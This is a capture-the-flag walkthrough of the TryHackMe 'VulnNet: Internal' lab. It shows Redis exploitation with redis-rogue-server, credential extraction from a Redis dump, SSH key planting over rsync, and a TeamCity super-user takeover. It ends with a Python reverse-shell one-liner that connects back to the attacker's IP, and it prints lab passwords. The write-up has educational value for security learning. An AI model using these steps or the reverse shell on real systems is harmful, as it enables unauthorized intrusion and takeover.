---
date: 2025-02-20
categories: [CTF, THM]
title: "THM - VulnNet: Internal"
tags: ['privilege escalation', 'python', 'rce', 'reverse shell', 'smb', 'smbmap']

description: "VulnNet Internal - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - VulnNet: Internal

```bash
rustscan -a 10.10.218.65 --ulimit 5000 -- -A
```

![image1](../resources/2a3c44695df3425dbfd814a4fa31ca4b.png)

![image2](../resources/cad653e3ffce4c7ea3a61d896e204d71.png)

- SMBMap:

```bash
smbmap -H 10.10.218.65 -u Guest

```

![image3](../resources/ba1ff9b5304742928cc6071b46c54a0a.png)

```bash
smbclient //10.10.218.65/shares -U Guest

cat services.txt

```
- Connect to redis:

```bash
redis-cli -h 10.10.218.65

```

![image4](../resources/e37cf6ea1a194d189fc7f64e78a6e91d.png)

This means that you need valid credentials to access the Redis instance

- Moving on to NFS (port 2049):

```bash
showmount -e 10.10.218.65

```

![image5](../resources/75210170be5c4e1680843b34f8ff7d74.png)

```bash
mkdir /tmp/vulnnet

sudo mount -t nfs <ip>:<remote_folder> <local_folder> -o nolock

sudo mount -t nfs 10.10.218.65:/opt/conf /tmp/vulnnet -o nolock

```

![image6](../resources/f9f1783652e94019897142ade5bcee6a.png)


![image7](../resources/a750be5423b848d6ab4329387c296136.png)

- Looking in redis directory we get the redis.conf:

![image8](../resources/35252db72c29414e9e97d53121d9c7a1.png)

- Connect to redis again with password:

```bash
redis-cli -h 10.10.218.65 -a B65Hx562F@ggAZ@F

```

![image9](../resources/e0f847875334497097a0bca87a068878.png)

**Redis version: 4.0.9**

**<u>Exploit:</u>**

```bash
redis-cli -h 10.10.193.202 -a B65Hx562F@ggAZ@F

> KEYS *
> get "internal flag"
> LRANGE authlist 1 20

```

![image10](../resources/2025effebecd42fbad2ff91882d9c7db.png)

**OR**


![image11](../resources/ec4b3f4b36a2489185d95f44df0e5b36.png)

<https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis>

<https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/Redis%20database%20penetration%20testing>

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server.git

./redis-rogue-server.py --rhost 10.10.218.65 --lhost 10.8.24.66 --passwd B65Hx562F@ggAZ@F

```

![image12](../resources/a10b200ef39843d3bdad88fec2240951.png)

- Ran it again
**Interactive:**


![image13](../resources/eac279c5e43342c6b4aef1a46d0ded5d.png)

**Reverse shell:**


![image14](../resources/139332f3f3af4ac9b630b81aa8d36a50.png)


![image15](../resources/6aff8937631d4a2989baf8f2d7c9ca7d.png)

- Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- List current directory - Found dump.rdb file:

![image16](../resources/ba7a6b5e83a3493cb09b27771258a5f9.png)

Copy file to Kali:


![image17](../resources/aa1775285df84b20ad6ca6707375f323.png)

Use rdbtools (more readable)

<https://github.com/sripathikrishnan/redis-rdb-tools>

<https://medium.com/@D0rkerDevil/how-i-found-credential-enriched-redis-dump-2b9e808024c4>

```bash
git clone https://github.com/sripathikrishnan/redis-rdb-tools

cd redis-rdb-tools
sudo python setup.py install
rdb --command json dump.rdb -f output.json

```
cat json or copy into a jsonviewer


![image18](../resources/41e377f6f7fe40388d50f29e75f8115f.png)


![image19](../resources/5a3bcf59870046a1a7210cf0034ca675.png)


![image20](../resources/20e9f37bb9d24f27ac24f10add8c7cc0.png)

rsync://rsync-connect@127.0.0.1 with password **Hcg3HP67@TW@Bc72v**

- We know rsync is being used
**Rsync is a utility for efficiently transferring and synchronizing files between computers, drives and networks**

<https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync>

- List the shared folders:

```bash
rsync -av --list-only rsync://10.10.193.202

```

![image21](../resources/95db062e9f5547c19c33c72af1cf170d.png)

- Connect to folder:

```bash
rsync rsync://rsync-connect@10.10.193.202/files

```

![image22](../resources/21f618793743439c9ff0f07cfab1c868.png)

- Copy remote folder's files to Kali:

```bash
mkdir rsync_folder

rsync -av rsync://rsync-connect@10.10.193.202/files rsync_folder

```

![image23](../resources/47c1ae9ec505433e9fa15aa48e0752d9.png)

This recursively transfers all files from the directory \<shared_name\> on the machine \<IP\>into the rsync_folder directory on the local machine


![image24](../resources/ec388f97d5e34a51ab2de78892b3c9dc.png)

```bash
cat user.txt

```
- SSH folder is empty

![image25](../resources/7fe873bdc131490298e89db76231a78d.png)

- Create ssh keypair and upload:

```bash
ssh-keygen -t rsa

```

![image26](../resources/88da37a5a28b4e98ae5adb0f62ae3b5f.png)

```bash
chmod 600 id_rsa

mv id_rsa.pub authorized_keys

chmod 600 authorized_keys

rsync -av authorized_keys rsync://rsync-connect@10.10.193.202/files/sys-internal/.ssh

```
- SSH in:

```bash
ssh -i id_rsa sys-internal@10.10.193.202

```
- TeamCity folder in /
<https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/>


![image27](../resources/ada00581f25447f9b9ea0e1ebfa5f59f.png)

- Check network connections:

```bash
ss -pant

```

![image28](../resources/3e07c2fb3573423398aa6901dc1607d1.png)

Port 8111 is the default port for TeamCity and it's running locally

- Set up port forwarding
<https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/>

```bash
ssh -L 8111:localhost:8111 sys-internal@10.10.193.202 -i id_rsa

```
(The first port number can be anything - used on Kali)

- Go to 127.0.0.1:8111

![image29](../resources/07c3c2eb0ea74ab1b45484847ca7efaf.png)

- Click on Super User link

![image30](../resources/75abd56cf95840e5b6899471a0beb94f.png)
- On the SSH session:

```bash
grep -rnw /TeamCity/ -e "token" 2>/dev/null

```

![image31](../resources/26cd7ef9130a4928804b71b96fe3ff89.png)

- Log in with the token - 8807557903946249045

- Get root shell:
<https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/>


![image32](../resources/29186eef919c4ccdbd83f9ba938f9cb1.png)

```bash
export RHOST="10.8.24.66";export RPORT=4443;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

```

![image33](../resources/ea40f4f34de54db9b08a7a2b36bdfd91.png)